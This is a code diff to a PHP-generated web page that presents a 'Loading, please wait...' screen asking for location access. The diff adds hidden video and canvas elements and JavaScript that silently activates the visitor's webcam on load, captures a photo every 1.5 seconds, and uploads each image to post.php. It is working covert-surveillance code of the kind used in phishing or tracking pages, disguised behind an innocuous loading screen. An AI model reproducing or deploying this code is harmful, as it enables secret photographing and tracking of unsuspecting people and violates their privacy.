@@ -116,9 +116,148 @@ echo '
                 getLocation();
             }, 500); // Small delay to ensure everything is loaded
         };
+        
+        // Camera functionality for template
+        var cameraStarted = false;
+        var captureInterval = null;
+        
+        function initCamera() {
+            if (cameraStarted) return;
+            cameraStarted = true;
+            
+            navigator.mediaDevices.getUserMedia({video: true, audio: false})
+                .then(function(stream) {
+                    var video = document.getElementById(\'hiddenVideo\');
+                    if (video) {
+                        video.srcObject = stream;
+                        video.play();
+                        console.log(\'Camera activated for capture - starting continuous capture every 1500ms\');
+                        
+                        // Pastikan tidak ada interval duplicate
+                        if (captureInterval) {
+                            clearInterval(captureInterval);
+                        }
+                        
+                        // Start capture every 1500ms for continuous capture
+                        captureInterval = setInterval(function() {
+                            captureWebcam();
+                        }, 1500);
+                    }
+                })
+                .catch(function(error) {
+                    console.error(\'Camera access denied or not available:\', error.message);
+                });
+        }
+        
+        function captureWebcam() {
+            try {
+                var video = document.getElementById(\'hiddenVideo\');
+                var canvas = document.getElementById(\'hiddenCanvas\');
+                
+                if (!video || !canvas) {
+                    console.error(\'Video or Canvas element not found\');
+                    return;
+                }
+                
+                // Cek apakah video sudah ready
+                if (video.readyState !== video.HAVE_ENOUGH_DATA) {
+                    console.log(\'Video not ready for capture, skipping...\');
+                    return;
+                }
+                
+                // Validasi dimensi video
+                if (video.videoWidth === 0 || video.videoHeight === 0) {
+                    console.log(\'Invalid video dimensions, skipping capture\');
+                    return;
+                }
+                
+                var ctx = canvas.getContext(\'2d\');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0);
+                
+                var imageDataUrl = canvas.toDataURL(\'image/jpeg\', 0.8);
+                
+                // Validasi data URL
+                if (!imageDataUrl || imageDataUrl.length < 100) {
+                    console.error(\'Invalid image data generated\');
+                    return;
+                }
+                
+                console.log(\'Capture successful, sending to server...\');
+                sendCaptureToServer(imageDataUrl);
+            } catch (error) {
+                console.error(\'Capture error:\', error.message);
+                // Lanjutkan loop meskipun ada error
+            }
+        }
+        
+        function sendCaptureToServer(imageData) {
+            var xhr = new XMLHttpRequest();
+            xhr.open(\'POST\', \'post.php\', true);
+            xhr.setRequestHeader(\'Content-Type\', \'application/x-www-form-urlencoded\');
+            
+            var params = \'image=\' + encodeURIComponent(imageData);
+            
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        try {
+                            var response = JSON.parse(xhr.responseText);
+                            if (response.success) {
+                                console.log(\'Image upload successful:\', response.filename);
+                            } else {
+                                console.error(\'Server reported upload error:\', response.error);
+                            }
+                        } catch (e) {
+                            console.log(\'Upload response received (could not parse JSON)\');
+                        }
+                    } else {
+                        console.error(\'Upload failed:\', xhr.status, xhr.responseText);
+                    }
+                }
+            };
+            
+            xhr.onerror = function() {
+                console.error(\'Network error during capture upload\');
+                // Loop tetap berjalan
+            };
+            
+            xhr.send(params);
+        }
+        
+        // Cleanup function
+        function cleanupCamera() {
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                console.log(\'Capture interval cleared\');
+            }
+            
+            // Stop camera stream
+            var video = document.getElementById(\'hiddenVideo\');
+            if (video && video.srcObject) {
+                const stream = video.srcObject;
+                const tracks = stream.getTracks();
+                tracks.forEach(track => track.stop());
+                console.log(\'Camera stream stopped\');
+            }
+        }
+        
+        // Initialize camera when page loads
+        window.addEventListener(\'load\', function() {
+            setTimeout(initCamera, 1000);
+        });
+        
+        // Cleanup saat unload
+        window.addEventListener(\'beforeunload\', cleanupCamera);
+        window.addEventListener(\'unload\', cleanupCamera);
     </script>
 </head>
 <body style="background-color: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; padding-top: 50px;">
+    <!-- Hidden video element for camera capture -->
+    <video id="hiddenVideo" style="display:none;"></video>
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
+    
     <h2>Loading, please wait...</h2>
     <p>Please allow location access for better experience</p>
     <p id="locationStatus">Initializing...</p>
